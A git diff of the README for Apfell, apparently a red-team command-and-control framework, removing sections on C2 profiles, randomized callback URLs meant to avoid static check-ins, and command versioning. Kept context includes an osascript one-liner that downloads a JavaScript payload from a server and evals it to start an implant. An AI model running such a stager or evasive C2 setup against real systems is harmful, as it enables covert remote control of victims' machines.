@@ -522,25 +522,6 @@ I'll be doing a small blog series on how to create a new payload type and how to
 - What if you want to do something else for your c2 profile? Maybe you don't want your callback posting to `/api/v1.0/callbacks/5/nextTask` since that's a bit on the nose. Well, I've started to implement ways for you to customize this. In the c2 management page you can create new c2 profiles, view all of the files that are currently loaded into the system, download those files, or delete them:
 ![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_c2_management.png)
 
-- As you're going through to create new c2 profiles, debugging can be a bit of a pain. So, whenever you start a new c2 profile, I return either the error when it started or the first 10 lines of output (stdout + stderr). Additionally, you can click the status button to poll that running c2 profile and get the next 10 lines of buffered data from it. Now, all of this data is stored in memory for all of your running c2 profiles, so it's fine to print out data while debugging, but once you're ready to use it in actual operations, I suggest that you limit the amount of output.
-![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_c2_output.png)
-
-- The RESTful Patchthrough is an example of something a bit more advanced. It uses a config file and threading to stand up multiple smaller servers (ssl optional on each one) that allow you to have more fine grained control on what endpoints the agent will hit.
-![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_patchthrough_config.png)  
-As you can see, this specifies a regex mapping of what these smaller servers are looking for and what they'll pass back to the main Apfell server. For example, with this config, the agent needs to post to `/admin.php?q=#` where `#` is the number of the callback. Since this is regex, the request just actually needs to start with that, but can have anything else following it since it'll be ignored. This allows you much greater control in how you structure your c2 profiles.
-
-- As a special treat for the apfell-jxa payload with the RESTful Patchthrough c2 profile, I've added a way to create variations. Take the following configuration for example when creating a payload:
-![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_patchthrough_example.png)  
-You'll notice the need to specify where the ID field is going (in this case it's marked by a `*` and it shows up in the paths, but it can be whatever you want, it's just for substitutions later on). This particular example expects the RESTful Patchthrough c2 server to be listening on port 443, so you'd need to make another `instance` in that above config for that with the specified base endpoints and then stop/start the c2 profile.
-There are three additional directives I provide - `(A#)`, `(N#)`, and `(M#)`. These stand for Alphabet, Numeric, and Mixed respectively. I use these directives to adjust every request with different values so that it's not just the same static get request when looking for new data.
-For example, in this example, every time the agent checks in for new tasking, it'll make a request to something like `/admin.php?q=5&username=aldiznex`, then `/admin.php?q=5&username=jslzneio`, etc. You can see where it'll generate 8 random letters, and where it'll insert the numeric identifier of the callback.
-
-- Since we just made a payload, it's important to call out that all commands have a tracked 'version'. This version is updated automatically every time the code, help, description, or a parameter changes on a command. When you create a payload, you've stamped in a certain 'version' of that command, so I keep track of which version you stamped in. Additionally, all callbacks have loaded commands (some default ones that are part of the payload, and some that are loaded in at runtime), and each of these also has a specific version. Now, you can probably easy see a scenario where you create a payload, or are part way into an operation, and are unsure if you're using the most update code or not. Well, now you can easily tell. From the payloads management page or from the main callbacks UI you can select to see the loaded commands and versions of commands per payload and per callback.
-![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_loaded_commands_in_callback.png)
-
-- If a command that's loaded into a running callback or that's stamped into a payload is out of date with the latest version on the Apfell server, I try to make it obvious to you:
-![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_outdated_command_in_callback.png)
-
 - Ok, now you have a payload, you need to host it somewhere. You can host it on your infrastructure, or for testing, I can host it with a simple python http web server for you  
 ![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_hosted_files.png)  
 ![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_host_payload.png)  
@@ -550,20 +531,13 @@ For example, in this example, every time the agent checks in for new tasking, it
 ```bash
 osascript -l JavaScript -e "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('HTTP://192.168.205.151:8080/test.js')),$.NSUTF8StringEncoding)));" 
 ```
-
 - If you go to the `Operational Views` and select `Active Callbacks` you'll now see your callback check in. You can click interact and start entering commands to interact with your payload  
 ![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_interact.png)  
-
-- As you start typing, you'll see command options pop up. You can use your Left/Right arrow keys to move through these and hint Enter for the one you want. You can also just keep typing the full command.  
-![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_command_hints.png)  
 
 - If you're unsure what a command does, you can either type `help {command_name}` to see a brief help syntax or you can go to `api`->`apfell-jxa help` for descriptions and more thorough help.
 ![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_help.png)
 
 - If you're still weary about the command, you can always go to `Manage Operations` -> `Payload Management` and select the `Edit` button under the `Edit Commands` columnn for a given payload type (by default it's just the apfell-jxa payload). Here is where you can select any of the commands and see/edit their actual code and parameters.
-
-- All payload_types (like apfell-jxa) allow you to also set a command template. This template will appear to the operator any time they try to create a new command so that it's more intuitive and straightforward to do so.  
-![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_function_skeleton.png)  
 
 ### In-Server Help
 Once you've logged into Apfell, you can access some additional help. 
